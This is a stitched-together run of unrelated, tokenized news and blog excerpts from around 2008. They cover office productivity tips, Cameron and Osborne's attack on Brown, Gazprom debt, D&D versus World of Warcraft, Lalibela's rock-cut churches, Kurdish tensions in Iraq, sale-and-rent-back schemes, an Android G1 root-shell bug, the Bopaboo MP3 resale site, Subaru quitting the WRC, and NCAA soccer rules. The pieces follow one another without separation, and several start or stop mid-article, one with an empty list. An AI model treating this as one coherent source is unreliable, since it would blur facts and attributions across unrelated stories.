" With the extra time , put more thought and effort into your top priorities . "
4 . Ignore e-mails and voice mail
Most of us respond to e-mails and voice mail as soon as we have a message .
But Kate Rawlings , a trainer for talent acquisition firm SearchPath , recommends limited interaction with voice mail and e-mail .
" I check my e-mail twice a day , once in the morning and again at the end of the day , " she reveals .
" I 'll check voice mail at lunch and at the end of the day . "
Even if your responsibilities preclude you from completely ignoring e-mails , you can often minimize the distractions of a steady stream of incoming messages .
Programs like Outlook allow you to turn off any pop-up messages that alert you to a new message .
5 . Set aside time to clear away the cobwebs
Health economist Patti Peeples suggests that workers set aside one day every month to wrap up any unfinished projects or address incomplete tasks .
" This means no e-mail and no phone for one full workday , " she says .
When workers spend most of their time on high - priority projects , it 's important to designate a time to clear away the cobwebs and resolve any old issues .
6. Goof off
Setting aside time to goof off at work can relieve stress , improve morale and even help with team building efforts .
Most importantly , it can recharge workers who are in the midst of a long , stressful workday .
" It makes a huge difference , " reveals consultant Deborah Grayson Riegel , president of Elevated Training .
" Surf the Internet , play solitaire , close your eyes .
Check out , rest and repair , " she suggests .
7 . Lower your standards
Riegel says that many people " procrastinate because they are perfectionists .
They put off getting started on projects because they want all the conditions to be perfect . "
Workers need to remember that perfection is n't always possible and to do the best they can without getting bogged down in unrealistic expectations .
Trista Harris , executive director of the Headwaters Foundation for Justice , has a simple suggestion : " Learn to let things be good enough . "

' You 're to blame for our broken economy ' : Rattled Cameron seeks to undermine Brown
The Tories desperately sought to undermine Gordon Brown 's renewed popularity yesterday with a concerted attack on his economic record .
In a choreographed move , David Cameron and George Osborne both signalled an end to the political truce over the financial crisis .
The Tory leader used a speech to the City to tell Mr Brown that he ' cannot hide from his mistakes ' - a message which was echoed by the Shadow Chancellor in a radio interview .
David Cameron made his attack in the City on Gordon Brown 's handling of the economy .
Earlier , the Tory Shadow Chancellor George Osborne spoke out on the BBC's Today Programme
They blamed the Prime Minister personally for Britain's ' broken economy ' , saying that he had allowed debt and borrowing to spiral out of control .
The intervention showed that the Tories have been stung by recent plaudits for Mr Brown 's handling of the financial crisis .
Earlier this month , Mr Cameron and Mr Osborne rose above the political fray to offer the Government support for its £ 500 billion bail - out of the banking system .
Since then , Mr Brown has enjoyed a bounce in popularity and has been feted at international summits for the widely - copied rescue plan .
With the issue likely to take centre stage for months to come , the Opposition are desperate not to let their previous lead in the polls slip away .
At the London headquarters of Bloomberg yesterday , Mr Cameron said Mr Brown 's economic policies had resulted in ' complete and utter failure ' and his errors had led to the downturn .
The Prime Minister ' cannot hide from his mistakes , he cannot hide from the truth , ' he said .
The Prime Minister has just returned from an EU conference , pictured here with its president Jose Manuel Barroso , where he was lauded for the rescue plan he developed for the financial markets
' This crisis has highlighted just how mistaken Labour 's economic policy has been .
The economic assumptions that Gordon Brown made in the last decade now lie in ruins . '
Moments earlier , Mr Osborne told the Today programme : ' When the house is on fire , as it was a few days ago when the banking system was near collapse , then we supported the Government .
' But then you are entitled to ask who built the house , who allowed it to catch fire and how are we going to rebuild the house so it never catches fire again .
' If you look now at the burnt wreckage of the last ten years of economic policy , we can see that the mistakes that were made were made by the man who was the Chancellor at the time - Gordon Brown . '
George Osborne told the Today programme that mistakes in economic policy were made by Gordon Brown
Mr Cameron also pointed out that Labour had allowed unchecked immigration to help fuel the economic growth , without regard for the pressure on schools , hospitals and transport systems caused by unprecedented levels of newcomers .
This was ' unsustainable ' , he said .
Mr Brown refused to hit back at the Tories and Treasury minister Yvette Cooper accused them of ' juvenile political games ' .
Asked about Mr Cameron 's wide - ranging attack , the Prime Minister said : ' My undivided attention is on taking this country through the difficult times as a result of a global problem that started in America .
' I think the whole country wants everybody who can to work together through these difficult challenges .
' I am determined that we as a nation come through these difficult times . '
In a further sign of his current positive international reputation , Mr Brown was yesterday given the platform of an interview with the respected Washington Post to promote his plan for a new international banking system .
He said the ' old post - war international financial institutions ' were out of date and had to be rebuilt for a new era in which there is ' global , not national , competition and open , not closed , economies ' .
Mr Brown 's comments came in advance of a weekend summit at Camp David between U.S. president George Bush , French president Nicolas Sarkozy - also the current EU president - and European Commission boss Jose Manuel Barroso .
After five years of record prices for natural gas , Gazprom is $ 49.5 billion in debt .
By comparison , the entire combined public and private sector debt coming due for India , China and Brazil in 2009 totals $ 56 billion , according to an estimate by Commerzbank .
Mr. Putin used Gazprom to acquire private property .
Among its big - ticket acquisitions , in 2005 it bought the Sibneft oil company from Roman A. Abramovich , the tycoon and owner of the Chelsea soccer club in London , for $ 13 billion .
In 2006 it bought half of Shell ’s Sakhalin II oil and gas development for $ 7 billion .
And in 2007 , it spent more billions to acquire parts of Yukos , the private oil company bankrupted in a politically tinged fraud and tax evasion case .
Rosneft is deeply in debt , too .
It owes $ 18.1 billion after spending billions acquiring assets from Yukos .
And in addition to negotiating for a government bailout , Rosneft is negotiating a $ 15 billion loan from the China National Petroleum Corporation , secured by future exports to China .
Under Mr. Putin , more than a third of the Russian oil industry was effectively renationalized in such deals .
But unlike Hugo Chávez of Venezuela or Evo Morales of Bolivia , who sent troops to seize a natural gas field in that country , the Kremlin used more sophisticated tactics .
Regulatory pressure was brought to bear on private owners to encourage them to sell to state companies or private companies loyal to the Kremlin .
The assets were typically bought at prices below market rates , yet the state companies still paid out billions of dollars , much of it borrowed from Western banks that called in the credit lines in the financial crisis .
Rosneft , which was also held up as a model of resurgent Russian pride and defiance of the West as it was cobbled together from Yukos assets once partly owned by foreign investors , was compelled to meet a margin call on Western bank debt in October .
To anyone who says that Dungeons & Dragons 4th Edition has been made to be just like World of Warcraft , I just have one thing to say .
You ’re wrong .
Now , I can see why people might think 4e is more like WoW than previous editions of D&D as well as other tabletop rpgs .
The crunch has definitely been favored over flavor , and Wizards has attempted to really balance the classes this time , as opposed to letting the disparities between said classes lie .
Which is n’t necessarily a bad thing , and is likely in fact quite good , though that ’s not really at issue right now .
But it could help make it seem as though no class has a true niche .
Sure , they ’re focused on different roles , but anyone can heal themselves now , and wizards can continue fighting as long as they can stand .
In addition , the focus on crunch over fluff can make the game feel less personal to some people .
They even want to charge a monthly fee for D& Di , which could be looked at as a way of jumping on the bandwagon of snagging monthly payments just because they can .
If that does n’t scream MMO , I do n’t know what does .
Here ’s the thing that assures me , and should assure you , that D&D can never become an MMO ( well , aside from things like Dungeons and Dragons Online anyway ) .
Since D&D is played at the table , with friends , and with a human GM making rules decisions , tabletop rpgs can go infinitely further in depth and can handle far more situations than any computer game .
- Want to attempt to teleport into the enemy fortress ?
WoW wo n’t let you do that .
- Want to have a battle from dragonback , with a wizard flying alongside you for support ?
In WoW , mounts are only for transportation .
- Want to have meaningful interaction with other characters , both PCs and NPCs alike ?
Look at chat in WoW sometime and try to find meaningful interaction .
The computer controlled NPCs wo n’t help you out either .
- Want to have a meaningful impact on the world that will effect everyone else in the world as well ?
WoW ca n’t do that .
- Want to participate in the creation of a unique , epic story ?
Oh right , WoW is scripted , and goes where the developers say it goes .
- Want to jump through the glass roof , swing from the chandelier , and kick the sword from the emperor ’s hand just before he slays your best friend ?
WoW ca n’t even begin to figure out how you might do that .
Of course , you might fail that in a D&D game as well , but at least you can try … and you still might succeed too .
The point here is n’t to say WoW is bad .
I have plenty of other articles that explain why I do n’t like MMORPGs .
The point is that you can always do more with a tabletop game because people are flexible , and can make judgement calls on the fly if you want to try something not strictly supported by the rules , or even just not anticipated by the developer .
In a computer game , if the rules do n’t support it , or a developer did n’t think you might like to try it or could n’t implement it , you simply ca n’t do it .
Furthermore , the tabletop rpg does n’t have to cater to thousands of people just starting everyday who want the same experience as everyone else .
The plot moves on , and the world moves on with it in D&D .
Saving that village actually has a real effect on the world .
Perhaps a small one , but it ’s there .
If you get a band of adventurers together to slay a dragon that ’s terrorizing the countryside , bards will sing songs of your valor in the years to come , and it makes a very real difference in the world .
Of course , you could also try to make a deal with the dragon , in which he assists you in world conquest in return for a hefty share of treasure or some other mutually beneficial arrangement .
In WoW , when you kill Onyxia , it just spawns again next week … and for other groups who have n’t fought it , it ’s still there in another instance .
And no , you ca n’t try to cut a deal with Onyxia either .
The plot actually moves in a tabletop rpg , and players can have a real effect on the world , and do things you would n’t expect them to while still moving the game along .
Finally , although this is less important than the other arguments , crpgs were created based on tabletop rpgs .
So it would be much more fair to say that WoW mimics D&D .
However , I know that ’s not what people generally mean when they say D&D 4e is like an MMO , but it ’s still food for thought .
The small town of Lalibela in Ethiopia is home to one of the world 's most astounding sacred sites : eleven rock - hewn churches , each carved entirely out of a single block of granite with its roof at ground level .
Were it not for these extraordinary churches , Lalibela would almost certainly be well off the tourist radar .
A dusty rural town nestled into rolling countryside , Lalibela only recently received electricity .
It has few motorized vehicles , no gas stations and no paved streets .
Isolated from the modern world , the town goes about its business much as it has for several hundred years .
Of Lalibela 's 8-10,000 people , over 1,000 are priests .
Religious ritual is central to the life of the town , with regular processions , extensive fasts , crowds of singing and dancing priests .
This , combined with its extraordinary religious architecture and simplicity of life , gives the city of Lalibela a distinctively timeless , almost biblical atmosphere .

History of the Rock - Cut Churches of Lalibela
The town of Lalibela was originally known as Roha .
It was renamed after the 12th - century King Lalibela , who commissioned these extraordinary churches .
Lalibela was a member of the Zagwe dynasty , which had seized the Ethiopian throne around 1000 AD .
When his rivals began to increase in power , Lalibela sought the support of the powerful Ethiopian Orthodox Church by building the churches in this small town .
King Lalibela 's goal was to create a New Jerusalem for those who could not make a pilgrimage to the Holy Land ( and to create a sacred city to rival powerful Axum , with its Ark of the Covenant ) .
According to some reports , he had been to the Holy Land himself and was inspired by what he saw .
But the king made no attempt to copy the churches of the Holy Land ; in fact , Lalibela 's sacred architecture could not be more unique .
The churches of Lalibela were not constructed — they were excavated .
Each church was created by first carving out a wide trench on all four sides of the rock , then painstakingly chiseling out the interior .
The largest church is 40 feet high , and the labor required to complete such a task with only hammers and chisels is astounding .
Popular legend has it that angels came every night to pick up where the workmen had left off .
One of the churches , Bet Maryam , contains a stone pillar on which King Lalibela wrote the secrets of the buildings ' construction .
It is covered with old cloths and only the priests may look on it .
King Lalibela 's project for gaining the church 's favor had two unexpected results : the creation of a holy place of unparalleled beauty and the king 's conversion to a religious life .
After laboring for 20 years , he abdicated his throne to become a hermit , living in a cave and eating only roots and vegetables .
To this day , Ethiopian Christians regard King Lalibela as one of their greatest saints .
The churches have been in continuous use since they were built in the 12th century .
The first Europeans to see these extraordinary holy sites were Portugese explorers in the 1520s , one of whom noted in his journal that the sights were so fantastic , he expected readers of his descriptions would accuse him of lying .
What to See at the Rock - Cut Churches of Lalibela
The roofs of the Lalibela churches are level with the ground and are reached by stairs descending into narrow trenches .
The churches are connected by tunnels and walkways and stretch across sheer drops .
The interior pillars of the churches have been worn smooth by the hands of supplicating worshippers .
The rock - cut churches are simply but beautifully carved with such features as fragile - looking windows , moldings of various shapes and sizes , different forms of crosses , swastikas ( an Eastern religious motif ) and even Islamic traceries .
Several churches also have wall paintings .
Each church has its own resident monk who appears in the doorway in colorful brocade robes .
Holding one of the church 's elaborate processional crosses , usually made of silver , and sometimes a prayer staff , these monks are quite happy to pose for pictures .
Some sport incongruously modern sunglasses with their splendid ensemble .
There are 11 rock - cut churches at Lalibela , the most spectacular of which is Bet Giorgis ( St. George's ) .
Located on the western side of the cluster of churches , it is cut 40 feet down and its roof forms the shape of a Greek cross .
It was built after Lalibela 's death ( c.1220 ) by his widow as a memorial to the saint - king .
It is a magnificent culmination of Lalibela 's plans to build a New Jerusalem , with its perfect dimensions and geometrical precision .
Unlike some of the other churches , St. George 's is plain inside .
A curtain shields the Holy of Holies , and in front of it usually stands a priest displaying books and paintings to visitors .
In the shadows of one fo the arms of the cruciform church is its tabot , or copy of the Ark of the Covenant .
One explorer was allowed to open it and found it empty .
No one was able to tell him what happened to its contents . [ 1 ]
In the " Northern Group " across the main road from St. George , the most notable church is Beta Medhane Alem , home to the Lalibela Cross and believed to be the largest monolithic church in the world .
It is thought to be a copy of St. Mary of Zion in Axum .
Bete Medhane Alem is linked by walkways and tunnels to Beta Maryam ( St. Mary 's ) , possibly the oldest of the churches .
In the east wall of the church is an array of geometric carved windows in a vertical line .
From the bottom up is : a Maltese cross in a square ; a semi-circle shape like that on the Axum stelae ; a Latin cross ; and a simple square window .
The windows illuminate the Holy of Holies in which the church 's copy of the Ark is placed .
Other decorations include a Star of David combined with a Maltese cross , a Sun with a smiling human face flanked by eight - spoked wheels , Mary on a donkey accompanied by Joseph , and an Annunciation .
Next to Beta Maryam is Beta Golgotha , known for its artwork which includes life - sized carvings of saints on the walls .
It is also home to the tomb of King Lalibela , over which stands a gold - draped Ark .
The Western group is completed by the Selassie Chapel and the Tomb of Adam .
The " Eastern Group " includes :
Farther afield lie the monastery of Ashetan Maryam and Yimrehane Kristos church ( possibly from the 11th century ) .
Tips for Visiting
Getting down and into the churches of Lalibela requires some dexterity .
The steps can be steep , rocky and rough .
Self - appointed helpers help you on the steps as well as take care of your shoes , which you have to remove when you enter the churches .
When you come out , you will find your shoes neatly lined up with the others .
Many visitors to Lalibela hire a local tour guide to show them around and explain the sights .
Is n't it amazing how quickly Iraq has slipped down the list of defining issues for the presidential election , after every pundit in the country originally opining that it would be the defining argument to be fought ?
Of course , since those pronouncements we 've had Georgia and the progressively chillier disagreement with Russia , we 've had Afghanistan and especially Pakistan go to hell in a handbasket and we've had the economy do an impression of Chernobyl .
Oh , and the Witchfinder from Alaska .
But there are still stormclouds on the Iraqi horizon , no matter that the Right wants to declare a whole new Mission Accomplished banner day .
The Sunni Awakening is getting restless , the Shiite majority still have nasty internal feuds to resolve and the Kurds ... well , Bush 's bestest Iraqi allies throughout the occupation still have a damn good chance of being the spark that sets off a regional powderkeg .
The Turks have already come very close to getting embroilled in an Iraqi mess when they sent a large force across the border last winter against Kurdish PKK separatist terrorists and are already set to do it again .
The danger was always that the Kurds ' military , the peshmerga , would turn out to resist the incursion and drag the Iraqi central government in too leaving the US torn between ripping up either the NATO alliance or years of Iraqi occupation .
So it was interesting recently to see an interview with Ahmet Davutoglu , the chief foreign policy aide to Turkey 's prime minister , on the Council For Foreign Relations ' website a few days ago .
He warned that recent optimism on Iraq in the United States overlooks significant , dangerous problems which remain unresolved and set out a viewpoint that says Iraq should be seen as a Yugoslavia on the verge of breakdown .
There is Shiite , there is Sunni , there is Kurd , there is Turkoman .
...
Iraq 's constitution again and again refers to Shiites , refers to Sunnis , to Arabs , Kurds , and it creates its own dilemma .
Having rights , I mean cultural rights , ethnic rights , but trying to establish an order based on these ethnicities , based on these identities and other differences .
So , Yugoslavia has collapsed , but without getting any lesson from Yugoslavia we are trying to create another Yugoslavia in the Middle East .
The Lebanese , because of this political structure , had a twenty - year civil war .
But Iraq became another Lebanon because of ethnic and sectarian definitions .
Where is , for example , the most alarming indication of this is in Kirkuk .
Iraq is a small [ microcosm of the ] Middle East .
You have all the ethnicities of the Middle East in Iraq .
And Kirkuk is a small Iraq .
Kirkuk , he says , is " like creating a bomb and giving it to the people . "
Of course , you could n't have prevented the break up of Yugoslavia just by carefully keeping any mentions of ethnic divisions out of official documents , and that 's highly unlikely to work in Iraq either .
Tito managed it by being a charismatic , ruthless strongman , a real - life heroic leader against an evil occupation and playing strongly to nationalism he continually worked to define .
And without him , it broke apart in short order .
I just do n't see any kind of Tito figure in Iraq at present .
And the Kurds keep pushing the central government .
After a recent confrontation between peshmerga and the Iraqi Army which ended just short of actual shooting at a small disputed town Northwest of Baghdad last month , there was no conciliatory mood .
" The current problem is over borders , because they [ the Iraqi government ] believe the borders of Kurdistan should be where the former ousted regime [ of President Saddam Hussein ] decided on , " said Massoud Barzani , president of Iraq 's northern Kurdistan region , in a meeting with Kurdish journalists on Sep. 28 .
" From now on , if Iraq sends its forces to somewhere in disputed areas , then we will dispatch our forces to the same spot as well .
If they send one brigade , we will send two , " Barzani said .
His remarks raised the current tensions to a new level , signaling that Kurds will not shy away from fighting the army of the very government whose president is Kurdish , as well as some key ministers .
Last month , Sheikh Homam al - Hamudi , a Shia Arab who heads the Iraqi Parliament 's foreign relations committee , warned Kurds on behalf of Prime Minister Nouri al - Maliki that " any [ Kurdish ] Peshmarga who violates the blue line will be chased out by the [ Iraqi ] security forces . "
The blue line refers to the official border between areas under Kurdistan Regional Government ( KRG ) jurisdiction and the rest of Iraq .
KRG runs the three northern provinces of Arbil , Sulaimaniya and Dohuk and has no official jurisdiction over Khanaqin , Kirkuk and Nineveh province , home to the city of Mosul .
So now the Kurds are looking at the possibility of a civil war with the Iraqi government and a cross - border war with their massive neighbour to the North , both in search of their own independent homeland .
In either case , the US gets to play piggy in the middle , damned whichever side it takes .
One alternative that has been mooted in the past was a soft partition , peaceably rather than through war and under a " federal " disguise , which might give everyone enough of what they wanted that no - one would start shooting .
Joe Biden has been a major proponent of that plan but it only has two major problems - back when the US could have imposed it by fiat it would have led to civil war ( whoever breaks up Iraq will have the Sunnis who were used to ruling it all under Saddam clamoring for their blood ) and now there 's no way that Maliki , believing himself a strongman , will allow it to happen .
Maliki , though , is n't as strong as he thinks he is and I 'm just no longer sure there are enough Iraqis so see themselves as Iraqis first and foremost to do the job of keeping it all together .
If there were , surely a multi-sectarian nationalist coalition ( like the one that has kept promising it will form under various secular leaders from Chalabi to Allawi ) would have already taken power by a parliamentary defeat of the separatist Powers That Be .
I can quite understand why Ambasador Davutoglu thinks that ethnic and religious differences among Iraq 's leadership are bound to flare again - and I do n't believe there 's a whole lot America or anyone else can do about that .

Jane and Richard Hudson say they feel they have been robbed
As the credit crunch bites some people who can't pay their mortgages are turning to sale and rent back schemes .
But there are fears that they have little protection against unscrupulous operators .
The schemes give struggling homeowners the chance to sell their houses to a company and then rent them back .
It 's a growing business with some 2,000 schemes in the UK - but for some it has not turned out to be the lifeline they had hoped .
One such couple are Jane and Richard Hudson .
When they fell behind with mortgage payments early last year they asked their local council for advice .
Among the options discussed , Basildon Housing Department suggested sale and rent back and handed Jane a leaflet for a company called Home Assured .
Within days of contacting them , the paperwork had been done - and for the Hudsons the deal sounded so simple .
They robbed me , they 've robbed my kids
Jane Hudson
" You just get a phone call saying , ' I 'm going to buy the house .
We 're going to buy it for this amount of money , is that agreeable ? ' "
Mrs Hudson said .
" Of course it was - someone was willing to buy our house and let us stay on as tenants . "
' Robbed me '
But things went badly wrong and before the end of their initial 12 month lease , the company wanted them out .
Home Assured had already taken more than £ 19,000 in fees .
It also kept a further £ 20,000 of the family 's equity on deposit - money they are still waiting to get back .
The Hudsons , with their five children , are now squeezed into rented accommodation , having lost their home of 13 years .
" They robbed me , they 've robbed my kids and they 've knocked my confidence , " Mrs Hudson said .
She had this advice for other homeowners : " Anyone who 's considering doing this sale and rent back - I would say do n't do it .
Just do n't do it or you 'll lose out . "
With mortgage arrears on the rise , more and more people like the Hudsons are being tempted into what seems like a quick fix .
And while it may be the right option for some , there 's growing concern that vulnerable homeowners are being misled .
Advice to homeowners
There are dozens of sale and rent back companies advertising online and it is a completely unregulated business .
They can say what they like and print what they like
Andrea Rozario
Safe Home Income Plans
What they offer is n't illegal , but many believe customers are n't being given the full picture .
The industry body representing regulated equity release schemes has been compiling a host of advertising material which it wants Trading Standards to investigate .
Andrea Rozario , from Safe Home Income Plans ( SHIP ) , says the sale and rent back sector needs to clean up its act .
" Whilst there may be some ethical companies out there , there is an awful lot of companies that are springing up that have no real idea how to portray the risks to customers , " she said .
" They can say what they like and print what they like . "
SHIP has produced a list of recommendations for homeowners considering a sale and rent back scheme .
The do's include : Speak with your lender if you are having problems meeting your monthly re payments
Talk to an organisation such as the Citizen 's Advice Bureau or the National Debt Helpline
Consider other alternatives such as trading down , family help , renting a room or any savings or policies you could use first
If sale and rent back is feasible , do consult your family about your intentions
Speak with a qualified financial adviser who will discuss your options with you
Get independent legal advice
The don'ts are : Do n't be put under pressure .
Speak with the companies you owe money to sooner rather than later
Do n't forget that the monthly rent is a commitment you may not be able to keep up , and that the amount of rent is likely to increase in the future
There is no guarantee you will get housing benefit to cover the rental cost , no matter what the company tells you The man who appears on the Hudsons ' lease is Philip Hope , but the BBC was unable to reach him for comment .
Trading Standards in Reading are now investigating Home Assured and have received complaints from 10 other people who have lost their homes .
Basildon Council admitted giving the Hudsons a leaflet about Home Assured , but insisted that it was intended to highlight sell - to - rent generally - not the company itself - as one of the many options open to people at risk of being made homeless .
" All our records suggest this was an isolated case , and at no point has the council actively recommended Home Assured Ltd or distributed any material on its behalf , " it said in a statement .
The Office of Fair Trading is looking into the sale and rent back sector and is due to publish its findings soon .
If you have had any problems with Home Assured or with other sale and rent back companies , then please post your comments below .

What are these ?
Google has fixed an a potentially devastating bug in its newly released Android operating system .
Some users of T - Mobile 's G1 phone found that typing any word on the phone 's keyboard — in any application — sent whatever they typed to the phone 's command line shell .
Those commands were then executed with root user privileges , meaning there were no limitations on what the commands could do to the phone .
For instance , texting the word ' reboot ' would actually cause the phone to do so .
" We fixed the bug on Oct. 31 and are currently rolling out the fix to G1
devices , " a Google spokesperson told Wired.com .
Not all G1 phones may have been fixed though as T - Mobile is rolling out the patch in stages and there could be some phones still to be updated .
The bug affected almost all G1 phones and not just phones that had been " jailbroken " ( hacked to work with unauthorized applications ) .
" This bug does affect users of G1 running RC29 and earlier , " says the Google spokesperson .
" RC30 fixes this issue and it is not present in the emulator . "
RC29 and RC30 refer to updates to the Android firmware .
A test this morning at the Wired.com office did not show the behavior on a G1 phone running the RC19 version of the firmware .
The latest update has been rolled out to all G1 phones but users have to click " update " directly on their device for Google to consider the process complete , says the Google spokesperson .
" We 're in the midst of that . "
Despite the publicity around the latest Android flaw , it could not have caused much of a security problem , says Charlie Miller , a mobile - security specialist at Independent Security Evaluators
" It is such a basic problem that it is just embarrassing , " says Miller .
" It 's not really a security problem since you can't do anything with the phone remotely . "
Miller discovered one of the earliest bugs in Android and says Google fixed that flaw within two weeks of being alerted .
Miller says Android developers were probably rushing to meet a deadline and did n't test the code in detail , leading to the bug .
" It was something they were using and may have forgotten to turn off , " he says .
" It 's just sloppy work . "
Going forward , Google says it has created an online group to announce security updates and fixes .

Tired of that new Britney Spears single ?
A new service called Bopaboo offers the unlikely prospect of selling your MP3s , uploading songs in the same way that you would trade in used CDs .
However , the difference between an MP3 and a used CD is that even after you give it away ( or sell it ) , it 's still on your computer .
Create or upload a copy and the original is still there on your desktop .
That does n't seem to bother Bopaboo .
" Stop illegally sharing and start legally selling ! " they bellow on their website .
" Buy DRM - free mp3's [ sic ] starting @ $ 0.25 . "
Bopaboo presumes that any song uploaded to the site is legally obtained , and they plan to make users sign a contract saying so .
But just as used CD shops can be places to launder ill - gotten goods , so could a filesharer upload their latest torrent 's - worth of songs – and then turn a tidy profit from clueless Bopaboodniks .
In fact , there 's nothing stopping music pirates from filling Bopaboo 's servers with their illicit booty , not just collecting kudos – as they would on filesharing networks – but collecting real , bankable money .
Take one copy of Britney Spears 's Womanizer , make a million copies , upload to Bopaboo , wait and – well , if Bopaboo became the success story it hopes to be – buy a house .
Then again , Bopaboo will probably join the piles of crackpot Web 2.0 ideas that never found their angel investors .
The site is in " beta " , is invitation - only and has n't even chosen its " leadership team " .
In fact , all they really have are some screenshots and a ridiculous name ...
Knowing Silicon Valley , the FBI is just around the corner .

The world rally championship is facing a major crisis after Japanese carmaker Subaru announced on Tuesday that it was quitting the competition ahead of the 2009 season .
The Subaru of Colin McRae in typical action during the 1998 British round of the world championship .
Subaru 's withdrawal comes just a day after rivals Suzuki pulled out of rallying 's premier competition , which has lost one - third of its constructors this week as the global economic downturn bites .
It follows the shock decision of Honda , Japan 's second biggest car manufacturer , to withdraw from Formula One .
" Our business environment has been dramatically changed due to the quick deterioration of the global economy , " Subaru parent company Fuji Heavy Industries said in a statement released on Tuesday .
" In order to optimize the management resources and to strengthen further the Subaru brand , FHI decided to withdraw from WRC activities at the earliest timing . "
Subaru has been one of the leading constructors in the rally championship , helping British drivers Colin McRae and Richard Burns to world titles .
But in recent years its fortunes have waned , with the Citroen team of current world champion Sebastien Loeb and Ford dominating .
Subaru finished a distant third in this year 's constructors race .

One to cut costs
The team is run by Prodrive , whose chairman David Richards issued a defiant message as the news of Subaru 's pull out became public .
" Subaru 's departure from the world rally championship is a great loss as it is one of the sport 's icons , " he told Press Association .
" Although this decision closes a significant chapter in Prodrive 's history , our focus now turns to the future . "
Richards said that his company hopes to run a team in the 2010 championship when a raft of new technical regulations will be implemented to drive down costs .
As the level of professional soccer in the US improves and financial interest increases , there ’s good reason to revisit the National Collegiate Athletic Association ( NCAA ) rules that restrict student soccer players from developing as fully as their foreign counterparts .
Traditionally , US athletes are groomed in higher education to represent that value and prepare for post - sports careers , and accordingly , Division I college soccer has been the primary feeder to a professional career and the national team .
Now , however , the new Major League Soccer ( MLS ) youth academies will train , fund , and sign players early , encouraging early withdrawal or possibly bypassing college altogether .
MLS is also turning away from colleges and heavily recruiting more skilled foreign players to staff the starting eleven .
So although the NCAA ’s stated mission revolves around athletes ’ “ well - being , safety , and academic progress , ” its restrictive regulations put college soccer players at a competitive disadvantage – with the likely consequence that the best players will leave college , and that fewer college educated players will represent the US on the national and international stage .
To avoid this failure of its educational mission , the NCAA could allow Division I soccer to model traditional development programs and : 1 ) relax regulations restricting season length and coaching contact ; 2 ) allow increased student athlete contact with the professional environment ; and 3 ) increase the number of soccer scholarships .
Individual colleges could also broaden their vision by employing international coaches with valuable professional qualifications , but by virtue of their cultural background , no four - year degree .
“ We cannot be Germany , we cannot be England , we cannot be Brazil , ” said Sasho Cirovski , head coach at the University of Maryland , whose Terrapin ’s just won the American College Cup for the second time in four years .
“ College soccer , which is a larger scope of the college experience in America , must be part of the solution in any of the development programs we have . ”
The two routes , MLS academy and college , can work concurrently with the diverse American youth to create a competitive international influence .
The academies are fully funded by MLS franchises and select young players based on ability , as opposed to wealth or academic standing .
The college soccer route favors the affluent with traditional American backgrounds and values , but also provides an avenue for the late - blooming athlete , such as the Revolution ’s Steve Ralston , not even a starter on his varsity squad , yet Guillermo Barros Schelotto ’s greatest competition for 2008 MLS MVP .
“ Most of our athletes do n’t mature until they ’re 19 , 20 , 21 years old , ” said Bret Simon , head coach at Stanford University , “ it ’s very hard to predict when they ’re 13 , 14 , 15 , 16 , who will actually be the best players . ”
But to date , the NCAA have treated soccer as the bastard stepbrother of the big three American sports , football , baseball , and basketball , overlooking cultural differences and imposing regulations that restrict players from fully maturing .
The failure of this regime is evidenced in the 1998 World Cup , when the US finished in last place , in 2002 only advanced to the quarter finals , and in 2006 were eliminated from the group rounds after losing to Ghana .
Currently , most American MLS players have college degrees and are selected through the January college draft .
Overseas , however , most players follow a youth club curriculum and step right into professional contracts at 16 .
But MLS salaries are not so magnetic ( elite developmental contracts start at $ 12,900 and first team at $ 33,000 ) , and even then the odds of a professional career are miniscule .
In college , a four - year degree is the endgame , professional development limited ( even ridiculed ) , and a year of training crammed into a three - month fall season .
Improvements can be made .
1 ) Accelerate college soccer to a two - season schedule
Currently , Division I schools play 25 games altogether — 20 in the fall , five in the spring , plus playoffs and internationals .
Around the world , however , soccer plays for 10 months .
How close is the NCAA to switching to a two - season schedule ?
“ Probably as close as recognizing that FIFA is the world ’s governing body for soccer , ” quipped Barry Gorman , head coach at Penn State for 21 years .
Tom Jacobs , Director of NCAA Division I Soccer Championships from 1993 - 2004 , now with the United States Tennis Association , responded , “ FIFA has no jurisdiction over the American college and university system , . . . not over playing seasons and that sort of thing . ”
But in 2008 , draft prospects flopped and MLS teams crashed and burned in the CONCACAF tournament .
MLS is looking south of the border and overseas for players to make a difference on the first teams , the only teams since the reserves ( stocked with college players ) were cut for inadequacy this fall .
“ Follow MLS ? ”
“ A little bit , probably not as much as I used to , ” said Jacobs .
“ Follow a team ? ”
“ I do n’t follow any one particular team , ” said Jacobs .
“ Watch the MLS Cup ? ”
“ No , I did n’t have a chance , ” said Jacobs .
So , given this kind of interest , it ’s not surprising that college soccer , the primary feeder to the national team , is underdeveloped .
But why do Division I schools heavily recruit , subsidize , and produce professional football , basketball , and baseball players ?
Why are some sports allowed more games , longer seasons , more training ?
Answer : the NCAA looks at each sport differently , there are no across - the - board regulations , and it is this partiality that draws controversy .
“ The rules and such in football and basketball have been liberalized for Division I to provide opportunities for players to prepare for professional sports .
Money has driven that , ” said Doug Williamson , Assistant Director of Coaching Education and Development at the National Soccer Coaches Association of America ( NSCAA ) .
“ What the NCAA has done with soccer is to turn in the other direction .
They ’ve limited the time that coaches can work with players — they ’ve reduced it .
So we ’re at pretty much , in terms of the number of weeks a college coach can work with players , we ’re probably at one of the most restrictive times in our history . ”
“ Let ’s be honest , ” Williamson continued , “ the relaxing of Division I football regulations and Division I basketball regulations — some of these schools 10 years ago were playing 26 , 27 games , they ’re now playing 36 , 37 games in basketball – there ’s no educational philosophy there , that ’s about money .
That ’s about putting people in the seats to bring revenue into the college and university . . . [ Soccer coaches ] who do a great job with their players are being hamstrung by the restrictions placed on them by the NCAA .
We ’ve got some exceptional coaches , coaches of great quality , but if those coaches are n’t allowed to coach it does n’t matter how good they are . ”
“ As a soccer person , I agree 100 % that we should fashion a calendar with a split season fall and spring , ” said Stanford ’s Simon .
“ The big lure would be to play 10 or 15 games in the spring and 10 - 15 games in the fall .
You ’d take a month or two off in the winter like professional teams do and then in the summer the guys could join their summer teams or take some time off and it would resemble a professional model . ”
Cirovski and Simon fought for split seasons , and were turned down .
Currently , Division I soccer coaches are allowed 20 hours per week with an athlete within the 132 days of the season ; pre-season consists of 21 practices before the date of the first contest .
This is in stark contrast to the year round , 24/7 immersion of their foreign counterparts .
How can college players compete with this advantage when they graduate ?
Gorman has a plan that supports two 15 - week schedules and academic priorities .
“ If you can have cross-country , indoor track and outdoor track , why should n’t we be able to do something along the same lines with soccer , especially when you consider that those sports cross gender lines and soccer does the same thing . . .
Play your game on a Saturday or Sunday so the kids do n’t miss class time and during the five - day school week only practice three days .
